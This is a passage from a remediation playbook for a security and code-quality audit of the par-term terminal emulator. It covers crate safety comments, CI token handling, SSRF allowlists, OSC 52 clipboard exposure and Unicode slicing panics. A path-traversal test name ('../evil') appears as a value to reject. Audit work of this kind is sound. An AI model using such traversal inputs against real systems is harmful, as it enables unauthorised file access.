  path here**: `src/debug.rs` already resolves `temp_dir()` correctly; the `/tmp` problem is in the docs
  (DOC-006).
- **Verify**: `make checkall`; `ls -l "$TMPDIR"/par_term_debug.log` shows `600` after a fresh run.

### [SEC-017] Remove the public `'static` self-reference from `FontData`
- **Files**: `par-term-fonts/src/font_manager/types.rs:16`, `:58`; re-export at
  `par-term-fonts/src/lib.rs:24`
- **Steps**: Make `font_ref` private and expose an accessor with a lifetime tied to `&self`, or store an owned
  representation. At minimum change `pub font_ref` to `pub(crate)`.
- **Method**: `pub font_ref: FontRef<'static>` is laundered via `transmute` at `:58` on a `pub` struct;
  `FontRef` is `Copy`, so a downstream consumer can copy it out and hold it past the owner's drop.
  **Honesty note**: no in-tree trigger exists — `FontManager` is constructed once with no in-place replacement
  — so this is unsound *public API*, not a demonstrated defect, and explicitly **not** a SIGSEGV candidate. Fix
  it as API hygiene on a published crate, not as an incident.
- **Verify**: `make checkall`; `cargo doc -p par-term-fonts` shows the field is no longer public.

### [SEC-018] Correct two `SAFETY` comments that state the wrong invariant
- **Files**: `par-term-fonts/src/font_manager/loader.rs:61`; `src/font_metrics.rs:68`
- **Steps**: Replace "safe when called with a valid ID from `query()`" with the real contract:
  `make_shared_face_data` requires that the mmap'd font file is not mutated externally for the lifetime of the
  returned data. Note that both call sites immediately `.to_vec()`, which narrows the window.
- **Method**: A `SAFETY` comment asserting the wrong invariant is worse than none — the next reader validates
  against the stated condition and concludes the code is fine. Same failure mode as SEC-007's comment.
- **Verify**: `make checkall` (comment-only; no behavior change).

### [SEC-019] Document the OSC 52 clipboard-write default
- **Files**: `par-term-config/src/defaults/terminal.rs:61-63`; `SECURITY.md:118-122`
- **Steps**: Add a `SECURITY.md` note that OSC 52 clipboard writes are **enabled by default**, that a remote
  program can therefore stage the local clipboard, and that paste does not sanitize control characters — so the
  two compose. Cross-reference the config key that disables it.
- **Method**: This is standard terminal behavior with a toggle, so changing the default is a product decision
  outside this audit's scope. The finding is that the *composition* of default-on OSC 52 with unsanitized paste
  is undocumented while `SECURITY.md:118-122` already discusses the paste half.
- **Verify**: read-through; no build impact.

### [SEC-020] Enforce HTTPS and a size cap on config import
- **Files**: `par-term-settings-ui/src/advanced_tab/import_export.rs:211`; patterns to copy from
  `src/profile/dynamic/fetch.rs:82-88,161`
- **Steps**: Reject non-HTTPS schemes and apply a response size cap, mirroring `fetch.rs:82-88` and `:161`.
- **Method**: The repo's two other network paths already enforce both; this one is the inconsistency. Reuse
  their logic rather than writing a third variant — and see ARC-006, which consolidates this class.
- **Verify**: `make checkall`; importing over `http://` is refused; an oversized response is truncated/rejected.

### [SEC-022] Reject `..` in the shader create dialog name
- **Files**: `par-term-settings-ui/src/shader_dialogs.rs:70`
- **Steps**: Validate the name against a filename allowlist (alphanumeric, `-`, `_`) before joining it to the
  shader directory.
- **Method**: Local intent and template content only, hence Low — but a name-to-path join with no validation is
  the same class as SEC-010 and costs one line to close.
- **Verify**: `make checkall`; a name of `../evil` is rejected.

### [SEC-023] Pin `Ilshidur/action-discord` to a SHA
- **Files**: `.github/workflows/publish-crates.yml:201`; `.github/workflows/release.yml:508`
- **Steps**: Resolve `0.4.0` to its commit SHA (`git ls-remote https://github.com/Ilshidur/action-discord 0.4.0`)
  and pin both sites to it with a trailing `# 0.4.0` comment.
- **Method**: A tag is movable, and both steps carry secrets. Same reasoning as SEC-011. Verify the SHA
  resolves before committing.
- **Verify**: both workflows still run; no `@0.4.0` refs remain.

### [SEC-024] Stop persisting the tap token into `.git/config`
- **Files**: `.github/workflows/publish-homebrew-cask-core.yml:113-114`
- **Steps**: Replace the credential-in-URL clone with `actions/checkout` using a `token:` input, or configure
  an `http.extraheader` that is unset after use. Do not leave the token in `.git/config`.
- **Method**: A credential embedded in the remote URL is written to `.git/config` and survives for the rest of
  the job, where any subsequent step or log dump can read it.
- **Verify**: the workflow still pushes to the tap; `git config --get remote.origin.url` in a later step
  contains no token.

### [SEC-025] Stop the release workflow ignoring test failures — **five sites**
- **Files**: `.github/workflows/release.yml:97`, `:147`, `:192`, `:236`, `:319`
- **Steps**: Remove `continue-on-error: true` from all five `Run tests` steps. Confirm you have every one:
  `grep -n "continue-on-error" .github/workflows/release.yml`.
- **Method**: With this set, a release ships with a red suite on every platform. **Re-verified as still present
  after `eb97890b`**, which fixed the *publish ordering* on the same workflow and left these untouched — so the
  board's release-ordering item does not cover this. Consider whether any of the five was added to work around
  a known-flaky test; if so, `#[ignore]` that specific test with a reason instead of blanket-ignoring the suite.
- **Verify**: `grep -c "continue-on-error" .github/workflows/release.yml` returns 0 for test steps; a release
  dry-run with a deliberately failing test fails the job.

### [SEC-026] Fix the `Makefile` reference to a world-writable `/tmp` script
- **Files**: `Makefile:472`
- **Steps**: Either ship the script in the repo (e.g. `scripts/test_graphics.sh`) and invoke it from there, or
  delete the target if it is obsolete.
- **Method**: The target tells developers to `bash /tmp/test_par_term_graphics.sh`, a path nothing in-repo
  creates and any local user can write. **`Makefile` is a conflict file** — DOC-006 (`:13`) and DOC-015 also
  touch it. Re-read before editing.
- **Verify**: `make -n <target>` resolves to an in-repo path; `make checkall` unaffected.

> **SEC-021** is intentionally absent — it is satisfied by **QA-023** if that helper sets mode `0600`.
> **SEC-027** is informational (`run-steps.sh:100-101`, deliberate developer automation): no action.

---

# Phase 3b — Architecture (Parallel)

### [ARC-005] Correct the `WindowState` docstring
- **Files**: `src/app/window_state/mod.rs:7,11-37,45`
- **Steps**:
  1. Re-measure rather than trusting this playbook:
     ```bash
     grep -c "^impl WindowState" $(grep -rl "^impl WindowState" src/ --include='*.rs') | \
       awk -F: '{s+=$2} END {print "impl blocks:", s}'
     grep -rl "^impl WindowState" src/ --include='*.rs' | wc -l    # files
     sed -n '136,256p' src/app/window_state/mod.rs | grep -c "^    [a-z_]*:"  # fields
     ```
     Expect ~39 fields and ~94 blocks across ~91 files.
  2. Replace "30+ fields and 84 separate `impl WindowState` blocks" with the measured numbers **and a date**.
  3. Fix the ID labels: line 7 credits "ARC-001", lines 11+ say ARC-002, line 45 points ARC-003 readers at
     "ARC-001 in AUDIT.md". Make them internally consistent.
  4. Fix the dangling `AUDIT.md` reference at line 37 — point at `docs/architecture/STATE_LIFECYCLE.md` or the
     board card, not a file `/fix-audit` deletes when it finishes.
- **Method**: This docstring is the project's only early-warning mechanism against this god object, and it is
  stale *in the direction that hides the growth* — it advertises 84 blocks while there are 94. Prefer deleting
  the hand-maintained counts entirely over updating them (same reasoning as DOC-011 and QA-021): a number no
  process updates will drift again. If you keep them, add the measuring command as a comment so the next person
  can re-derive it.
- **Verify**: `make checkall`; re-run the commands above and confirm the docstring matches.

### [ARC-006] Consolidate the duplicated SSRF/host-allowlist validation
- **Files**: `src/http.rs:18,21,24,32,47,89`; `par-term-update/src/http.rs:27,30,33,41,56,88`
- **Steps**:
  1. Choose `par-term-update::http` as the survivor — it has the richer implementation, including
     `download_file` and `validate_binary_content`.
  2. Generalize its validator to take a caller-supplied allowlist parameter so the shader downloader can pass
     `ALLOWED_DOWNLOAD_HOSTS` while self-update passes `ALLOWED_HOSTS`.
  3. Delete `src/http.rs`'s copies of `HTTP_TIMEOUT`, `MAX_API_RESPONSE_SIZE`, `MAX_DOWNLOAD_SIZE`, `agent()`,
     and `validate_download_url`; re-export from `par-term-update`.
  4. **Take the union of the two allowlists' restrictions, not their intersection** — if one is stricter on a
     host, keep the stricter rule.
- **Method**: Two hand-synchronized copies of an SSRF defense is the highest-consequence DRY violation in the
  tree precisely because it is a security control: hardening one silently leaves the other weaker.
  `src/http.rs`'s own doc comment concedes it is "matching the validation pattern used by the self-update
  subsystem". **Coordinate with SEC-005**, which also edits `par-term-update/src/http.rs` — if SEC-005 lands
  first, build on it. **Security-relevant: commit separately and flag for manual review.** Watch the layering —
  the root crate may depend on `par-term-update`, but not the reverse.
- **Verify**: `make checkall`; `make deny`; existing tests for both download paths still pass; a
  non-allowlisted host is rejected on both paths.

### [ARC-007] Delete the unreachable `wgpu` feature and its two optional deps
- **Files**: `par-term-settings-ui/Cargo.toml:20-21,71`
- **Steps**:
  1. Confirm it is genuinely inert:
     ```bash
     grep -rn "egui_wgpu\|egui_winit\|cfg(feature" par-term-settings-ui/src | wc -l   # expect 0
     grep -n "par-term-settings-ui" -A3 Cargo.toml                                    # expect no features list
     ```
  2. Delete lines 20–21 (the optional deps) and line 71 (the feature).
- **Method**: A published crate advertising a capability it does not have is a semver-visible lie, and a Layer-2
  crate appearing to reach for GPU/windowing deps invites future code to actually do it, breaking the
  documented layering. Zero `cfg(feature = …)` attributes exist in the crate, so the feature would be inert
  even if enabled.
- **Verify**: `make checkall`; `cargo check -p par-term-settings-ui --all-features`.

### [ARC-008] Stop CLAUDE.md pointing contributors at a re-export shim
- **Files**: `CLAUDE.md:119`, `:202` *(the shim itself, `src/input.rs`, stays)*
- **Steps**: Change both references from `src/input.rs` to `par-term-input/src/lib.rs` (the `InputHandler`
  definition) and `par-term-input/src/key_encoding.rs` (sequence generation, which is what `:202` is actually
  about).
- **Method**: `src/input.rs` is two lines of `pub use par_term_input::{InputHandler, KeyInput};` — re-verified
  after `cb9abf12`, which added `KeyInput` but left it a shim. CLAUDE.md's "Adding a New Keyboard Shortcut"
  workflow tells contributors to "add sequence generation in `src/input.rs`", which is impossible. ~~**Keep the
  shim** — downstream `crate::input::` paths use it~~ — **superseded and now false.** This contradicted
  ARC-010 in this same document, and its stated reason ("downstream paths use it") was exactly what ARC-010
  exists to remove. The shim is deleted and all four importers repoint at `par-term-input`.
  **`CLAUDE.md` is the worst conflict file in this audit** — ten issues across four domains. Batch with DOC-006,
  DOC-007, DOC-011, DOC-015, DOC-018, DOC-023, QA-036, ARC-012 under a single owner.
- **Verify**: every path in CLAUDE.md's Key File Map resolves (`while read -r p; do [ -e "$p" ] || echo "$p"; done`).

### [ARC-010] Delete the redundant re-export shim modules
> **DONE.** Fifteen shims deleted across two passes; ~130 call sites repointed with zero
> visibility changes. Three crate-alias shims (`mcp_server`, `settings_ui`, `tmux`) are kept
> deliberately because they rename the crate. `src/config/mod.rs` is kept as a documented
> exception — it is a curated ~150-name facade with deliberate gaps, and the ARC-003 field
> drain touched none of its ~110 importers, which is the insulation it exists for. The file
> list below names four shims that were not the ones fixed; treat it as unreliable.

- **Files**: `src/shell_detection.rs` (4 lines), `par-term-settings-ui/src/shell_detection.rs` (4 lines),
  `src/status_bar/config.rs` (5 lines), `src/manifest.rs` (2 lines); declarations at `src/lib.rs:82,135`,
  `par-term-settings-ui/src/lib.rs:40`, `src/status_bar/mod.rs:38`
- **Steps**:
  1. For each shim, find its consumers (`grep -rn "crate::shell_detection\|crate::manifest" src/`).
  2. Repoint consumers at the sub-crate directly (`par_term_config::shell_detection`), then delete the shim
     file and its `mod` declaration.
  3. If a shim must stay for external compatibility, move the `pub use` into `lib.rs` and delete the
     standalone file.
- **Method**: Four modules exist only to `pub use` from a sub-crate "for backward compatibility", and
  `shell_detection` is re-exported **twice** even though both crates already depend on `par-term-config`
  directly — three plausible import paths for one symbol. The reason to bother: combined with ARC-008, this is
  the pattern that let ARC-001's 869 orphaned lines hide for multiple releases, because a directory of
  re-export shims looks exactly like a directory of implementations. Every step here is compiler-verified, so
  it is safe and mechanical.
- **Verify**: `make checkall` (the compiler catches every missed import).

### [ARC-011] Centralize the `url` dependency
- **Files**: root `Cargo.toml:213`; `par-term-update/Cargo.toml:23`; `[workspace.dependencies]` in root
- **Steps**: Add `url = "2"` to `[workspace.dependencies]`, then change both sites to `url.workspace = true`.
- **Method**: The root manifest states the policy — "Centralise all external deps shared across 2+ crates
  here" — and 56 of 57 shared deps follow it. `url` participates in security-relevant URL parsing in both
  consumers, so version skew between them is the concrete risk.
- **Verify**: `make checkall`; `cargo tree -p url` shows one version.

### [ARC-012] Correct the Layer 2 dependency prose
- **Files**: `CLAUDE.md:165` and the Layer 3 entry below it
- **Steps**: Reword Layer 2 from "Depend on `par-term-config` only" to "depend on `par-term-config` (plus the
  external `par-term-emu-core-rust` where noted)", and add the `par-term-emu-core-rust` edge to
  `par-term-terminal`, `par-term-tmux`, `par-term-scripting`, and `par-term-render`.
- **Method**: **The actual Cargo graph is correct** — all 14 manifests were verified with no cycle, no upward
  dependency, and no layer inversion. Only the prose is wrong. It matters because a version bump or publish-order
  change made from the doc alone would miss the emu-core coupling. Batch with the other CLAUDE.md edits.
- **Verify**: cross-check each layer line against `cargo metadata --no-deps | jq '.packages[].dependencies'`.

### [ARC-013] Retire or enforce the single-rendering-path invariant comment
- **Files**: `par-term-render/src/cell_renderer/instance_buffers.rs:84-88`
- **Steps**: If QA-011 lands, this function is deleted and the comment goes with it — nothing to do beyond
  confirming. If QA-011 is deferred, fix the comment's two errors (it claims the builder serves the shader
  path when it serves screenshots; it names "`pane_render.rs`" when the path is the directory
  `pane_render/mod.rs`) and add a test asserting the single call site.
- **Method**: The invariant currently holds but is enforced only by prose that is itself inaccurate. Check
  QA-011's status first — doing this work independently is wasted if the function disappears.
- **Verify**: `make checkall`.

---
# Phase 3c — Code Quality (Parallel)

## The Index-Confusion Pass — QA-004 … QA-008 + QA-014, ONE change

**Do these six together.** They share a root cause (a terminal column index used as a UTF-8 byte offset or a
`char`-vector index) and a fix vocabulary. Fixing them one at a time re-introduces the pattern, because each
site looks like a local off-by-one rather than an instance of a class.

**Step 0 — build the shared tools first:**
1. Add `column_to_byte_offset(s: &str, col: usize) -> usize` to a shared util module — walk `char_indices()`
   and return `s.len()` when `col` exceeds the char count (saturating, never panicking).
2. Note the existing char-safe truncation helper: `truncate_chars` at `src/ai_inspector/panel_helpers.rs:21`.
   **Reuse it; do not write a second one.**
3. Add a non-ASCII fixture set to reuse across all six tests: an accented Latin string (`"café"`), a CJK
   string (`"日本語"`), an emoji string, and a mixed string. **Every existing test input in this repo is ASCII
   — that is exactly why 1,965 green tests missed all six defects.**

### [QA-004] Copy-mode search slices a `String` with a column index
- **Files**: `src/app/copy_mode/search.rs:108,112,113,146,149`
- **Steps**: Convert `start_col` to a byte offset with `column_to_byte_offset` **against `text_lower`, not
  `text`** — `:112` lowercases first and `to_lowercase()` can change byte length. Apply at both `:113`
  (forward, `search_start = start_col + 1`) and `:149` (backward, `search_end = start_col`). Clamp both to
  `text_lower.len()`. When mapping the match position back at `:114`, convert the byte offset back to a column.
- **Method**: `start_col` is `self.copy_mode.cursor_col` (`:61`) — a terminal column. The `to_lowercase()`
  length change is the subtle half: even correct column→byte mapping on the *original* string can land
  mid-character in the lowercased one, so map against the string you actually slice. Note `:114` returns
  `search_start + pos`, a byte offset, into a field consumed as a column — fix that direction too or the cursor
  lands in the wrong cell on non-ASCII lines.
- **Verify**: `make checkall`; test entering copy mode on `"café"` and pressing `/` both forward and backward.

### [QA-005] `move_word_backward` indexes `chars[col]` with no upper bound
- **Files**: `src/copy_mode/motion.rs:41,46,50,114,118`
- **Steps**: Add `col < chars.len()` to the four while-guards at `:46`, `:50`, `:114`, `:118`, and clamp the
  seed at `:38` with `col = self.cursor_col.min(chars.len().saturating_sub(1))`.
- **Method**: The forward sibling at `:65` already guards both bounds — copy its shape rather than inventing
  one. `col` can exceed `chars.len()` because `Grid::row_text` filters wide-char spacer cells (so a CJK row has
  fewer chars than columns) while `move_to_line_end` sets `cursor_col = cols - 1`, and `:31` clamps only to
  `cols - 1`, not to the char count.
- **Verify**: `make checkall`; test `$` then `b` on `"日本語 test"`.

### [QA-006] Base64 decode indexes a 256-entry table with a raw `char`
- **Files**: `src/paste_transform/encoding.rs:46,57,63,64`
- **Steps**: Before the index at `:63`, add `if c as u32 > 255 { return Err(...) }` reusing the existing error
  at `:64`. Better: reorder so the validity check precedes the table lookup entirely.
- **Method**: The `Err` at `:64` is checked *after* the index, so the guard exists but arrives too late — this
  is an ordering bug, not a missing check, which is why it reads as correct on a skim.
- **Verify**: `make checkall`; unit-test decoding a string containing an emoji and a Cyrillic character.

### [QA-007] Hex decode byte-slices on `step_by(2)`
- **Files**: `src/paste_transform/encoding.rs:155,157,164,165`
- **Steps**: Filter with `c.is_ascii_hexdigit()` (not just `!c.is_whitespace()`) at `:155`, collect into a
  `Vec<char>` or `String` of validated digits, then pair them via `chunks(2)` over chars rather than byte
  `step_by(2)`. Make the even-length gate at `:157` count **chars**, not bytes.
- **Method**: Two defects compose: the filter admits non-hex multi-byte characters, and the length gate counts
  bytes. Validating to ASCII hex digits first makes byte length and char length identical, which closes both.
- **Verify**: `make checkall`; unit-test a mixed-width input like `"a" + é + "e"` and assert `Err`.

### [QA-008] Shader hex-color parsing byte-slices, defeating its own serde guard
- **Files**: `par-term-config/src/types/shader.rs:132,137`
- **Steps**: Change `:132` to `if !hex.is_ascii() || (hex.len() != 6 && hex.len() != 8) { return Err(...) }`.
  Keep the existing error message shape.
- **Method**: One-line fix, but note *why* it is Critical rather than cosmetic: the chain is `from_hex` ←
  `from_yaml_value` (`:262`) ← `deserialize_uniforms` (`:314-339`, wired at `:378`), which wraps the call in
  `Err => log::warn!` **specifically to skip bad entries gracefully**. A panic is not an `Err`, so it bypasses
  that net and crashes `Config::load()` or shader hot-reload — reachable from any **shared** `.glsl` file, so a
  downloaded shader can crash startup. **Fix this regardless of the deferred ARC-003 Config split.**
- **Verify**: `cargo test -p par-term-config`; `make checkall`; unit-test `"#1é234"` returns `Err`.

### [QA-014] Byte-slice display truncation, four sites
- **Files**: `src/search/mod.rs:499`; `src/app/render_pipeline/egui_overlays.rs:119-120`;
  `par-term-settings-ui/src/profiles_tab/dynamic_sources.rs:72-73`;
  `src/app/window_state/shader_ops.rs:219-221`
- **Steps**: Replace each `&s[..n]` with `truncate_chars(s, n)` from `src/ai_inspector/panel_helpers.rs:21`.
  For `dynamic_sources.rs` (a different crate) either move the helper somewhere shared or add a local
  equivalent. **⚠️ Re-read `shader_ops.rs:219-221` before editing — that line reference was not independently
  verified and may be off.**
- **Method**: `search/mod.rs:499` slices a `regex::Error` that echoes the user's own pattern, so an invalid
  regex containing an accent crashes; `dynamic_sources.rs` runs **every Settings frame**, so a non-ASCII URL
  crashes the Settings window continuously. ARC-002 (which would have rewritten this file's field paths) is
  deferred, so this is safe to apply now.
- **Verify**: `make checkall`; enter a regex like `caf(é` in search; add a dynamic profile source with a
  non-ASCII URL.

---

### [QA-002] Stop the per-frame full-grid deep clone *(fix with QA-024)*
- **Files**: `src/app/render_pipeline/gpu_submit.rs:358,360`; cache source at
  `src/app/render_pipeline/pane_render.rs:249-300`; `par-term-config/src/cell.rs:9`
- **Steps**:
  1. Add a persistent `overlay_scratch: Vec<Cell>` to window or pane state (co-locate with QA-024's
     `FrameState`).
  2. Replace `Arc::make_mut(&mut pane.cells)` with `scratch.clone_from(&pane.cells)` and apply overlays to the
     scratch buffer, then point the render at the scratch slice.
  3. Do not write the scratch back into the `Arc` — the mutation is transient by design.
- **Method**: The premise is what makes this Critical: `pane.cells` is always populated by `Arc::clone` from
  the cache (`pane_render.rs:260`), so the cache holds a second reference, refcount is always ≥2, and
  `make_mut` therefore **always** deep-clones — inside the cache built to avoid exactly that. `Cell.grapheme`
  is a `String`, so a 200×50 grid is up to 10,000 heap allocations per frame at 60fps. `clone_from` reuses the
  destination's existing `String` allocations, which is why it drops steady-state allocation to near zero
  rather than merely moving the cost. Reach is routine, not exotic: `url_overlay` is `Some` whenever
  `detected_urls` is non-empty and persists across cache-hit frames, so any pane showing a URL or file path —
  `ls`, `git status`, compiler errors, most prompts — pays it.
- **Verify**: `make checkall`; with a URL on screen, confirm allocation/frame time drops via the F3 overlay or
  `make run-perf`. Frame output must be pixel-identical.

### [QA-003] Move shader installation off the winit main thread
- **Files**: `src/app/window_state/action_handlers/integrations.rs:120-125`; pattern to copy at
  `src/app/render_pipeline/post_render.rs:288-296`; worker at `src/shader_installer.rs:406-493`
- **Steps**: Copy the `std::thread::spawn` + `mpsc` structure from `post_render.rs:288-296` (whose comment is
  literally "Spawn installation in background thread so UI can show progress"), move
  `install_shaders_with_manifest` into the worker, and poll the receiver on the existing tick so
  `set_installing` → progress → completion actually paints.
- **Method**: The correct pattern is 40 lines away in the calling file, so this is a copy, not a design. The
  status is set on the frame *before* the blocking call, so the progress UI it exists to show never paints —
  which is the tell that this is the same class as the already-fixed 30s `ureq` stall. That original fix has
  **not** regressed (`update_checker.rs:110,238` still use `spawn_blocking`); this sibling was simply missed.
- **Verify**: `make checkall`; trigger a shader install and confirm the window keeps redrawing and the progress
  status is visible.

### [QA-010] / [QA-023] / [SEC-021] One generic atomic-save helper — **do these as one change**
*(Three IDs, one entry. `[QA-010]` non-atomic writes, `[QA-023]` triplicated persistence layer, `[SEC-021]`
missing `0600` on `arrangements.yaml` — all resolved by the same helper.)*
- **Files**: `src/session/storage.rs:11,16,21,37-46,65,70`; `src/profile/storage.rs:10,15,20,40-46,64,69,79`;
  `src/arrangements/storage.rs:11,16,21,71,76,87`; reference at
  `par-term-config/src/config/persistence.rs:137-160`
- **Steps**:
  1. Read `persistence.rs:137-160` — the temp-write-then-`fs::rename` pattern, comment "Atomic save: write to
     temp file then rename to prevent corruption on crash".
  2. Create generic `load_yaml_or_default<T: DeserializeOwned + Default>(path) -> T` and
     `save_yaml_atomic<T: Serialize>(path, &T) -> io::Result<()>`. **The save helper must set mode `0o600`** —
     that is what satisfies SEC-021 for `arrangements.yaml`, which currently lacks it while sessions have it.
  3. Replace all three modules' five-function shapes with calls to the pair.
  4. Collapse the triplicated tests — the same four test names exist in all three files
     (`test_load_nonexistent_file`, `test_load_empty_file`, `test_save_and_load_roundtrip`,
     `test_save_creates_parent_directory`). Write them once against the generic helper.
  5. Keep the temp file in the **same directory** as the target so `rename` stays atomic (cross-filesystem
     rename is a copy).
- **Method**: These are one change, not three: QA-023's generic `save_yaml_atomic<T>` **is** QA-010's fix, and
  its mode bit **is** SEC-021's fix. Doing them separately means writing the atomic-save logic three times and
  then deleting it. The severity comes from the recovery behavior, not the write: `session/storage.rs:78-79`
  returns `Ok(None)` on an empty file and `profile/storage.rs:40-46` returns an empty `ProfileManager` — so a
  truncated file silently presents as "no saved data" with no error. Session save runs at **shutdown**, when a
  kill is most likely, and CLAUDE.md tells developers to `pkill -f "target/debug/par-term"`. Collapses ~290
  production and ~350 test lines.
- **Verify**: `make checkall`; a test that truncates a file mid-write and asserts the previous good content
  survives; `ls -l` shows `600` on all three artifacts.

### [QA-012] Drain ACP messages from `about_to_wait`, not the render path
- **Files**: `src/app/window_state/agent_state.rs:75-83`; `src/app/window_state/impl_agent.rs:218`;
  `src/app/window_state/agent_messages.rs`; `src/app/handler/window_state_impl/about_to_wait.rs`
- **Steps**: Call `drain_messages()` unconditionally from `about_to_wait()` alongside the other queue polls.
  Add a timeout to `AgentMessage::ConfigUpdate`'s `reply_rx.await`. Keep the render-path call or remove it —
  either is fine once the unconditional drain exists.
- **Method**: The bootstrap deadlock is the crux: every `needs_redraw = true` in `agent_messages.rs` sits
  *inside* the loop that follows the drain, so none can trigger the **first** drain. Nothing ties a redraw to
  "an agent is connected", and cursor blink — the only periodic trigger — is skipped when unfocused under
  `pause_refresh_on_blur` (default `true`). Two of three message variants are synchronous RPCs the agent blocks
  on, and `ConfigUpdate` has no timeout, so tabbing away can hang the subprocess indefinitely. **This fix is
  also QA-028's mitigation** for the unbounded `jsonrpc.rs:131` channel — land it first and re-scope QA-028.
- **Verify**: `make checkall`; `make acp-smoke` with the window unfocused/backgrounded, confirming the
  transcript completes.

### [QA-013] Log failed PTY writes at all 14 sites
- **Files**: `src/app/input_events/key_handler/mod.rs:315,539,596,623`;
  `src/app/mouse_events/mouse_button.rs:190,193,353`; `mouse_wheel.rs:131`; `mouse_move.rs:204`;
  `mouse_tracking.rs:85`; `src/app/input_events/key_handler/utility.rs:102`;
  `src/app/window_manager/menu_actions.rs:187`; `src/app/tab_ops/profile_ops.rs:144`;
  `src/app/window_state/agent_tick_helpers.rs:187`; `src/app/file_transfers/upload.rs:150`
- **Steps**: Replace each `let _ = term.write(...)` with
  `if let Err(e) = term.write(..) { crate::debug_error!("INPUT", "PTY write failed: {e}"); }`. Use a category
  matching the site (`INPUT`, `MOUSE`, `TAB_ACTION`). Confirm the count first:
  `grep -rn "let _ = term.write" src/ | wc -l`.
- **Method**: All 14 are in the **root** crate, so `crate::debug_error!` resolves — but see trap #2: do **not**
  convert existing `log::` calls elsewhere, which are correct. These sites run inside
  `spawn(async move { … })` with no caller to propagate to, which is why the errors were dropped; logging is
  the right remedy rather than plumbing a `Result` out. Impact is that a dropped keystroke or paste vanishes
  with no trace in the very log that exists to catch it.
- **Verify**: `make checkall`; kill a pane's shell and confirm a `PTY write failed` line appears in
  `"$TMPDIR"/par_term_debug.log` when typing into it.

### [QA-015] Stop indexing `[0]` on possibly-empty wgpu capability vectors
- **Files**: `par-term-render/src/cell_renderer/mod.rs:357,363,383,404`
- **Steps**: Replace each `[0]` with `.first().copied().ok_or(...)?` — the function already returns `Result`.
  Fix `:363` specially: `unwrap_or(surface_caps.formats[0])` evaluates the fallback **unconditionally**, so
  restructure to `.find(...).or_else(|| formats.first().copied()).ok_or(...)?`.
- **Method**: wgpu documents that these can be empty on an incompatible surface/adapter pair — its own
  `get_default_config` uses `.first()` for this reason. The `:363` eager-fallback bug means the panic fires
  even when `.find()` succeeds. **Depends on ARC-004**, which shifts line numbers in this file — re-read first.
- **Verify**: `make checkall`; if available, run under a software renderer (`LIBGL_ALWAYS_SOFTWARE=1`) and
  confirm a clean error instead of a panic.

### [QA-016] Propagate `current_exe()` failure instead of defaulting to standalone
- **Files**: `par-term-update/src/install_methods.rs:35-41`; guard at
  `par-term-update/src/self_updater.rs:41-57,59-60`
- **Steps**: Change the function to return `Result<InstallationType, _>` (or add an `Unknown` variant),
  propagate the `current_exe()` error, and make `self_updater.rs:41-57` **refuse** to update on unknown.
- **Method**: Fail **closed**: an unknown install type is not a standalone install. `unwrap_or_default()`
  yields an empty path, which falls through every substring check to `StandaloneBinary`, bypassing the
  Homebrew/cargo refusal. The escalation — `install_standalone` overwriting a package-managed binary and
  orphaning it — needs the second `current_exe()` at `:59-60` to succeed after the first failed, so it is
  conditional, but the wrong-classification half is unconditional.
- **Verify**: `make checkall`; unit-test that `detect_installation_from_path("")` does not yield
  `StandaloneBinary`.

### [QA-017] Use the focused window, not an arbitrary `HashMap` entry
- **Files**: `src/app/window_manager/cli_timer.rs:54,89`; `src/app/handler/app_handler_impl.rs:369,406`;
  `src/app/window_manager/settings_actions.rs:126,132`;
  `src/app/window_manager/config_propagation.rs:263`; accessor at `src/app/window_manager/mod.rs:159`
- **Steps**: Replace each "first window" lookup with `get_focused_window_id()` (`mod.rs:159`), which is already
  used correctly in `coprocess.rs:13,70,97`. Handle the `None` case explicitly rather than falling back to an
  arbitrary entry.
- **Method**: `windows` is a `HashMap<WindowId, WindowState>` (`mod.rs:67`) with unspecified iteration order.
  `cli_timer.rs:54` (`send_command_to_shell`) is the worst — a CLI command can reach the wrong shell.
  `app_handler_impl.rs:369` promotes an arbitrary window's config into global `self.config`, so per-window
  config can silently diverge. The two `cli_timer` sites are reached only from the startup timer when usually
  one window exists, which is why this is Medium rather than High. **May overlap the deferred ARC-002/ARC-005
  work** — if a focused-window accessor is introduced there, consume it.
- **Verify**: `make checkall`; with two windows open, confirm `--send-command` targets the focused one.

### [QA-018] Remove the 50 ms sleep from `Pane::drop`
- **Files**: `src/pane/types/pane.rs:380,405`; constructors at `:151,218,267,318`
- **Steps**: Replace `thread::sleep(Duration::from_millis(50))` at `:405` with a join or bounded wait on the
  refresh task's completion handle. If a bounded wait is used, cap it well below 50 ms and log on timeout.
- **Method**: The `shutdown_fast` early-return at `:380` does not cover this path, and `shutdown_fast` is
  `false` in all four constructors — so ordinary closes always pay it. Manual close and default
  auto-close-on-shell-exit both loop over exited panes **sequentially inside one `RedrawRequested`**, so closing
  a 6-pane split adds 300 ms+ to a single frame. All 15 `Drop` impls are otherwise clean (no panics, unwraps,
  or blocking locks) — keep it that way.
- **Verify**: `make checkall`; close a 6-pane split and confirm no visible stall.

### [QA-019] Stop enumerating system fonts twice on every font-size change
- **Files**: `src/app/window_state/renderer_ops.rs:53-55`
- **Steps**: Build the `FontManager` once and pass it into both `Renderer::new` and `CellRenderer::new` instead
  of letting each construct its own. Wrap the rebuild in `spawn_blocking` (or a worker thread) so the
  `block_on` no longer runs on the event loop.
- **Method**: `Renderer::new` builds a `FontManager` for metrics and **discards it**; `CellRenderer::new` builds
  a second — each doing `Database::new()` + `load_system_fonts()`. Reached from everyday zoom keybindings, menu
  items, and scroll-wheel zoom, so the cost is paid interactively.
- **Verify**: `make checkall`; zoom repeatedly and confirm no perceptible hitch; instrument to confirm one
  enumeration.

### [QA-020] Honor `timeout_secs` for workflow shell steps
- **Files**: `src/app/input_events/snippet_actions/workflow.rs:68-79`; pattern at
  `src/app/input_events/snippet_actions/shell_command.rs:54-163`
- **Steps**: Stop destructuring `timeout_secs: _`. Reuse the poll/kill timeout loop from
  `shell_command.rs:54-163` and move the execution off the main thread.
- **Method**: The field is parsed and thrown away while the sibling standalone path implements the timeout
  correctly — so this is a copy from a working implementation, not new design. `Command::output()` runs
  synchronously on the main thread, so a hung command freezes the UI indefinitely with no escape.
- **Verify**: `make checkall`; a workflow step running `sleep 60` with `timeout_secs: 2` must terminate at ~2 s
  with the UI responsive throughout.

### [QA-021] Delete the five stale `ARC-009` line-count comments
- **Files**: `par-term-render/src/renderer/mod.rs:1`; `par-term-render/src/renderer/rendering.rs:1`;
  `par-term-render/src/graphics_renderer.rs:1`; `par-term-render/src/cell_renderer/mod.rs:1`;
  `par-term-render/src/cell_renderer/background.rs:1`
- **Steps**: Remove the hand-maintained "(limit: 800 — approaching threshold)" counts, keep the extraction
